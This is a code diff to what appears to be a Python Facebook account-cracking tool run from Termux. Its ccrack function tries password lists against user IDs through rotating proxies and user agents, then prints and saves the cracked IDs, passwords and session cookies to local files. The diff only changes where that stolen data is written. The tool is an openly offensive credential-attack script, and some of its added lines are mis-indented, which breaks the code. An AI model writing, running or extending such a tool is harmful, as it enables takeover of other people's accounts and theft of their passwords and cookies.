@@ -39,7 +39,7 @@ import os, platform
 
 from concurrent.futures import ThreadPoolExecutor
 fast_work = ThreadPoolExecutor(max_workers=40).submit
-os.system('termux-setup-storage')
+
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 
 try:
@@ -918,7 +918,7 @@ def ccrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-*M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			nip=random.choice(prox)
@@ -960,13 +960,13 @@ def ccrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[65:80]
 				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
+                open('sdcard/DEVILS-IDS/devils_ok.txt', 'a').write(cid + '|' + ps + '\n')
+                open('sdcard/DEVILS-IDS/devils_cokie.txt', 'a').write(cid + '|' + ps + '|' + coki + '	\n')   
 				#print('\033[1;97m[DEVILS-CP] '+cid+' | '+ps+'\033[1;32m')
 				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
 				#print(f' Number or Email : {uid}')
 				#print(f' Cookie : {coki}')
-				open('DEVILS-IDS/devils_ids.txt', 'a').write(cid+'|'+ps+'\n')
-				open('DEVILS-IDS/devils_cokie.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
-				open('Devils-ok.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
+				open('SPY-VIP-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
 				oks.append(uid)
 				#cek_apk(session,coki)
 				break
